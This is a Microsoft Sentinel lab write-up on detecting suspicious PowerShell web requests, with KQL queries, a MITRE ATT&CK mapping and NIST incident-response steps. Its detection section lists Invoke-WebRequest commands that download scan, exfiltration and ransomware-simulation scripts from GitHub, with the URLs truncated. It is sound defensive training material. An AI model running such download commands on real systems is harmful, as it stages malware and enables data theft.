
# 🔍 PowerShell Suspicious Web Request – Microsoft Sentinel Lab

## 🧪 Scenario Overview

In this lab, we simulate a common post-exploitation tactic where an attacker uses PowerShell to download malicious payloads or tools from the internet using legitimate commands such as `Invoke-WebRequest`. This technique is often used to bypass traditional security mechanisms.

By leveraging Microsoft Defender for Endpoint and Microsoft Sentinel, we detect and investigate this suspicious activity using KQL (Kusto Query Language).

---

## 🎯 Lab Goals

- Detect the use of PowerShell to download remote content.
- Create a scheduled query rule in Microsoft Sentinel.
- Investigate and respond to the incident following the NIST Incident Response Lifecycle.

---

## 📍 Environment

- **VM Name**: `rich-mde-test`
- **Log Source**: `DeviceProcessEvents` (via Defender for Endpoint)
- **SIEM Tool**: Microsoft Sentinel
- **Primary Command**: `Invoke-WebRequest` or `iwr`

---

## 📌 Part 1: Alert Rule Creation

### Objective

Detect PowerShell usage of `Invoke-WebRequest` to download scripts or files.

### Initial Query

```kql
DeviceProcessEvents
| where DeviceName == "rich-mde-test"
| where FileName == "powershell.exe"
```

### Refined Detection Query

```kql
DeviceProcessEvents
| where Timestamp > ago(10d)
| where DeviceName == "rich-mde-test"
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "Invoke-WebRequest" or ProcessCommandLine contains "iwr"
| project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp desc
```

> 💡 *Note: VM is not always on, so we search across 10 days. If live 24/7, a 24-hour window would be more efficient.*

---

## ⚙️ Part 2: MITRE ATT&CK Mapping

| Tactic              | Technique                     | Description                                                                 |
|---------------------|-------------------------------|-----------------------------------------------------------------------------|
| TA0043 - Recon      | —                             | Gathering info; intent unclear                                              |
| TA0002 - Execution  | T1059.001 - PowerShell        | Execution of PowerShell scripts using Invoke-WebRequest                     |
| TA0009 - Collection | T1074.001 - Local Data Staging| Scripts stage data locally before exfiltration                             |
| TA0010 - Exfil      | T1041 - Exfil Over C2 Channel | Data exfiltration via HTTPS or similar                                      |
| TA0011 - C2         | T1071.001 - Web Protocols     | Uses HTTPS for downloads and C2 communication                               |

---

## 🚨 Alert Rule Deployment

After creating and testing the query, an alert rule was deployed in Sentinel. This rule was assigned, activated, and monitored for real-time threat detection.

---

## 🔍 Part 3: Incident Response (NIST Lifecycle)

### ➤ Detection & Analysis

PowerShell executed the following commands to download suspicious scripts:

```powershell
Invoke-WebRequest -Uri https://raw.githubusercontent.com/.../portscan.ps1 -OutFile C:\ProgramData\portscan.ps1
Invoke-WebRequest -Uri https://raw.githubusercontent.com/.../eicar.ps1 -OutFile C:\ProgramData\eicar.ps1
Invoke-WebRequest -Uri https://raw.githubusercontent.com/.../exfiltratedata.ps1 -OutFile C:\ProgramData\exfiltratedata.ps1
Invoke-WebRequest -Uri https://raw.githubusercontent.com/.../pwncrypt.ps1 -OutFile C:\ProgramData\pwncrypt.ps1
```

> 🧑‍💻 *User claimed they installed "free software"; in reality, the attack simulator executed the downloads.*

### ➤ Script Summaries

- **portscan.ps1** – Scans IPs 10.0.0.4–10.0.0.10 and logs to `entropygorilla.log`.
- **eicar.ps1** – Triggers AV detection via EICAR string.
- **exfiltratedata.ps1** – Exfiltrates dummy employee data to Azure.
- **pwncrypt.ps1** – Encrypts Desktop CSVs, deletes originals, drops ransom note.

### ➤ Containment, Eradication, Recovery

- Isolated VM via MDE.
- Performed anti-malware scan (clean).
- Removed isolation after confirmation.

---

## ✅ Post-Incident Activities

- Enforced user cybersecurity training (Ninjio).
- Mandated weekly training confirmation to supervisors.
- Restricted PowerShell access for non-essential users.

---

## 🏁 Final Actions

- Incident marked as: **True Positive - Suspicious Activity**
- Status: **Closed**
